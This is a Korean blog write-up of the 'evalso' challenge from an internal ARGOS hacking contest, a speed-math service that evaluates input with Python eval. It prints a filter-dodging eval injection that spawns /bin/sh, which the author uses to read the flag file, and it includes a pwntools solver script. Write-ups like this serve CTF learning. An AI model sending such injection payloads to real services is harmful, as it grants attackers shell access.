---
layout: post
title: "[JFS] evalso"
subtitle: "이발소"
tags: jfs
comments: true
---

### JFS란?
	ARGOS 내부 해킹 대회

***



![evalso](https://i.imgur.com/80zwpPS.png)

evalso 라는 100점짜리 문제.

문제는 다음과 같다.

![](https://i.imgur.com/hALQ6el.png)

5초안에 문제를 풀어라(?)

![](https://i.imgur.com/EnCtCdE.png)

>내부망에서만 접근 가능한 IP다.

다음과 같이 nc 했을 때, 수식이 나오고 답을 입력하면 다음 단계로 진행된다.

![](https://i.imgur.com/GAlNpRB.png)

수식을 풀면 되는 줄 알고 python의 pwntools를 이용하여 해보려 했지만... 

10개를 풀고나니 항이 3개가 되어 곤란해졌다. 

그래서 고민하던 중 예전에 봤던 PyJail 문제가 생각나서 쉘코드를 삽입해보았다.

` __import__('subpro'+'cess').call(['/bin/sh', '-s'])`

Python에서 'subprocess'를 우회하여 '/bin/sh' 즉 쉘을 실행시키는 쉘코드이다.

실행된 쉘에서 ls를 실행했더니

`evalso.py` 라는 파일이 달랑 하나 있었다.

`cat evalso.py` 를 입력하니 (5초안에 해야한다.) 플래그가 보였다. !

`JFS{eVaL_Iz_0UR_fRi3Nd}` flag가 python 파일에 코딩되어 있었다.

100점 획득!



****

사실 이 문제는 pyjail이 아니라 built-in function을 활용하는 문제였다. 위 수식을 받아서 '=?'를 제외하고 eval이라는 함수의 인자로 넣어서 입력하면 계산된 출력되는 점을 이용하는 문제였다.(ㅋㅋㅋ)



```python
from pwn import *

p = remote("168.188.123.207", 16160)

for i in range (0, 30):
        line = p.recvline()
        print line
        if not line[0] == 'a':
                result = line[:-3]
                print result
                p.sendline(str(eval(result))) #계산된 결과를 str형태로 바꾼 후 서버에 보냄
        else:
                result = line[5:-3] #"ans = " 처리
                print result
                p.sendline(str(eval(result)))
print p.recvline()
```



다음과 같은 python 코드를 실행하면 플래그가 나온다.